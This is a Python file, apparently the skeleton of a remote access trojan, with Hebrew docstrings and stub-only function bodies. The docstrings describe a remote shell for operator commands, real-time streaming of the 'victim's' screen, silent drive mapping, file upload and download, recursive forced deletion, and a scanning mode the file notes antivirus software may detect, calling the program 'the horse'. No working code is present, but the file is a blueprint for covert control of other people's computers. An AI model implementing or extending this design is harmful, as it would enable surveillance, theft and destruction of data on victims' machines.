import os
from PIL.ImageGrab import grab
import io
from time import sleep
from json import dumps
import shutil as sht
from ctypes import windll
import string
from Api.protocol import OK, BLOCK_FRM, SUM_BLOCKS
from Api.tcp_stream import MainTcpStreamer, read_from_file, write_to_file
from Api.error_api import PACKET_ERROR
from Api.config_packet import SetBlockPacket, GetBlockPacket
from Api.ManaIO import yield_file, open_file, ManaFileFolder, TypeFileBinary, MAX_SIZE_EDITOR, yield_4096_byte_array
from Api.scanner_api import run_shell, scan_by_payload


# ----------------------------------------------
# /* API MODES */
# ----------------------------------------------
# 1. mode shell
# 2. mode screen
# 3. mode explorer
# 4. mode download
# 5. mode upload


def mode_shell(setting_sock, port, parent_setting):
	"""
 	חיי התהליך הזה ותפקידו
  	תפקיד
   	1. חיבור חדש ביציאה שונה מהראשית
    	2. תקשורת מוצפנת 
     	3. מעבד פקודות ע"י גבי המערכת ומחזיר את הפלט

       	חיי התהליך
	תלויים במפעיל או עד שמתרחשת שגיאה
 	"""
	pass

def mode_screen_tcp(setting_sock, port, parent_setting):
	"""
 	חיי התליך ותפקידו
  	תפקיד
   	1. חיבור חדש
    	2. תקשורת לא מוצפנת
     	3. מקבל מהמפעיל הגדרות לתצורת שידור תוך כדי השידור
      	4. משדר בזמן אמת את כל המסך בהתאם לתצורה
       	חיי התהליך
	תלויים במפעיל או עד שמתרחשת שגיאה

  	פונקציה הזאת מבצעת מיפוי של כל המסך ללא אופטימציות
 	"""
	pass

def mode_screen_tcp_v2(setting_sock, port, parent_setting):
	"""
 	
	תפקיד
 	1. חיבור חדש
  	2. תקשורת לא מוצפנת
   	3. מקבל מהמפעיל הגדרות לתצורת שידור תוך כדי השידור
	4. משדר בזמן אמת את כל המסך בהתאם לתצורה

  	חיי התהליך
   	תלויים במפעיל או עד שמתרחשת שגיאה

    	בפונקציה  הזאת יש אוטומציה ואופטומציה לתהליך השידור
 	"""
	pass

def ModeExplorer(setting_sock, port, parent_setting):
	"""
 	תפקיד
  	1. חיבור חדש
   	2. תקשורת מוצפנת
    	3. מבצע הוראות הפעיל 
     	4. יוצר מיפוי של הכונן שנבחר (מתוך הכוננים הקיימים), ומחזיר את מבנה התקיות  בצורה שקטה
      
	חיי התהליך
 	תלויים במפעיל או עד שמתרחשת שגיאה
 	"""
	pass

def ModeDownload(setting_sock, port, parent_setting=None):
	"""
   	תפקיד
  	1. חיבור חדש
   	2. תקשורת לא מוצפנת
    	3. שולח את נתוני הקובץ (קבצים בלבד) למפעיל
     	4. משדר בקצב 4096 
      
	חיי התהליך
 	הסתיים תהליך הקריאה של הקובץ או שהתרחשה שגיאה
 	"""
	pass

def ModeUpload(setting_sock, port, parent_setting=None):
	"""
  	תפקיד
  	1. חיבור חדש
   	2. תקשורת לא מוצפנת
    	3. שולח את נתוני הקובץ (קבצים בלבד) למפעיל
     	4. יוצר מיפוי של הכונן שנבחר (מתוך הכוננים הקיימים), ומחזיר את מבנה התקיות  בצורה שקטה
      
	חיי התהליך
 	הסתיים תהליך הכתיבה של הקובץ או שהתרחשה שגיאה
  	"""
	pass

def mode_scanner(setting_sock, port, parent_setting=None):
	"""
 	תהליך מסוכן שעלול לגרום לזיהוי על ידי אנטי וירוסים
  	מבצע תהליכי סריקה המורכבים מרשימה שצד המפעיל שלח 
   	בה קיים פקודות מגוונות, תפקיד הסוס הוא, להחזיר את הפלט

     	קיים רק בגירסא של פייתון
 	"""
	pass

def set_X_parts_grab(grb, buffer:io.BytesIO, pkg:list[bytes], xp=3) -> bytes:
	"""
 	מבצע חלוקה ברמת התמונה של מסך הקורבן
  	מחלק את התמונה ל
   	X
    	פעמים
     	לאחר מכן מבצע בדיקה של אורך הנתונים באותו חלק ספציפי האם לשדר אותו או לא כחלק מהפריים לשידור
 	"""
	pass

def listdir(path) -> str:
	"""
 	הוספת יכולות והתאמה לפרוטוקול שלנו
  	:return: dump(dict(os.listdir))
 	"""
	pass

def list_drives():
	"""
 	מחזיר את רשימת הכוננים הזמינים במערכת
 	"""
	pass

def rename(path, n_path) -> int:
	"""
 	משנה שם לקובץ
 	"""
	pass

def del_force(path: str):
	"""
 	מוחק נתיב תיקייה או קובץ באופן רקורסיבי
 	"""
	pass

def is_valid_file_to_edit(path) -> int:
	"""
 	בדיקת תקינות, הרשאות, אורך הנתונים, ועוד
  	
 	"""
	pass


